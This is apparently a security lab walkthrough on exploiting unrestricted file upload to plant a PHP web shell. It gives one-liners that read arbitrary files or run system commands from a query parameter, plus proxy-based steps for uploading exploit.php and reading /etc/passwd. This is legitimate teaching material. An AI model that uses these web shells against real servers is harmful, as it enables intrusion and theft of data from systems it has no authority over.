## Exploiting unrestricted file upload vulnerability:

From a security perspective, the worst possible scenario is when a website allows you to upload server-side scripts, such as PHP, Java, or Python files, and is also configured to execute them as code. This makes it trivial to create your own web shell on the server.

#### Web shell

A web shell is a malicious script that enables an attacker to execute arbitrary commands on a remote web server simply by sending HTTP requests to the right endpoint.

If you're able to successfully upload a web shell, you effectively have full control over the server. This means you can read and write arbitrary files, exfiltrate sensitive data, even use the server to pivot attacks against both internal infrastructure and other servers outside the network. For example, the following PHP one-liner could be used to read arbitrary files from the server's filesystem:

```PHP
    <?php echo file_get_contents('/path/to/target/file'); ?>
```

Once uploaded, sending a request for this malicious file will return the target file's contents in the response.

A more versatile web shell may look something like this:

```PHP
    <?php echo system($_GET['command']); ?>
```

This script enables you to pass an arbitrary system command via a query parameter as follows:

`GET /example/exploit.php?command=id HTTP/1.1`

---

## One simple process: 

1. While proxying traffic through Burp or caido, log in to your account and notice the option for uploading an avatar image.

2. Upload an arbitrary image, then return to your account page. Notice that a preview of your avatar is now displayed on the page.

3. In Burp or caido, go to **Proxy > HTTP history**. Click the filter bar to open the **HTTP history filter** window. Under **Filter by MIME type**, enable the **Images** checkbox, then apply your changes. (By default in caido that image is also enabled)

4. In the proxy history, notice that your image was fetched using a `GET` request to `/files/avatars/<YOUR-IMAGE>`. Send this request to Burp Repeater or caido replay.

5. On your system, create a file called `exploit.php`, containing a script for fetching the contents of Carlos's secret file. For example:
    
```PHP
    <?php echo file_get_contents('/etc/passwd'); ?>
```
6. Use the avatar upload function to upload your malicious PHP file. The message in the response confirms that this was uploaded successfully.

7. In Burp Repeater or caido replay, change the path of the request to point to your PHP file: `GET /files/avatars/exploit.php HTTP/1.1`

8. Send the request. Notice that the server has executed your script and returned its output (command output) in the response.

--- 
